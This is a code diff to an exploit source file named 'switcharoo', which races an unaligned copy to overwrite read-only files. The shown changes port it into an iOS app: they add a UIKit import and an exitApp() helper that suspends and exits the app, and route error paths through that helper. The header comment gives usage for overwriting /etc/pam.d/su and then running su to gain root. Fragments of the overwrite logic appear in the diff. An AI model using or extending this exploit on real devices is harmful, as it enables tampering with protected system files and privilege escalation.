@@ -6,6 +6,7 @@
 // ./switcharoo /etc/pam.d/su overwrite_file.bin
 // su
 @import Foundation;
+#import <UIKit/UIKit.h>
 #include <pthread.h>
 #include <dispatch/dispatch.h>
 #include <stdio.h>
@@ -25,12 +26,19 @@
 #define T_ASSERT_MACH_SUCCESS(a, b, ...)
 #define T_ASSERT_MACH_ERROR(a, b, c)
 #define T_ASSERT_POSIX_SUCCESS(a, b)
-#define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { fprintf(stderr, c "\n"); exit(1); }}while(0)
-#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { fprintf(stderr, c "\n"); exit(1); }}while(0)
+#define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { fprintf(stderr, c "\n"); exitApp(); }}while(0)
+#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { fprintf(stderr, c "\n"); exitApp(); }}while(0)
 #define T_ASSERT_TRUE(a, b, ...)
 #define T_LOG(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)
 #define T_DECL(a, b) static void a(void)
 #define T_PASS(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)
+
+void exitApp(void) {
+    UIApplication *app = [UIApplication sharedApplication];
+    [app performSelector:@selector(suspend)];
+    [NSThread sleepForTimeInterval:2.0];
+    exit(0);
+}
 
 static const char* g_arg_target_file_path;
 static const char* g_arg_overwrite_file_path;
@@ -198,7 +206,7 @@ T_DECL(unaligned_copy_switch_race,
     size_t overwrite_length = ftell(overwrite_file);
     if (overwrite_length >= PAGE_SIZE) {
         fprintf(stderr, "too long!\n");
-        exit(1);
+        exitApp();
     }
     fseek(overwrite_file, 0, SEEK_SET);
     char* e5_overwrite_ptr = (char*)(e5 + ctx->obj_size - overwrite_length);
@@ -215,7 +223,7 @@ T_DECL(unaligned_copy_switch_race,
     }
     if (overwrite_first_diff_offset == -1) {
         fprintf(stderr, "no diff?\n");
-        exit(1);
+        exitApp();
     }
 
     /*
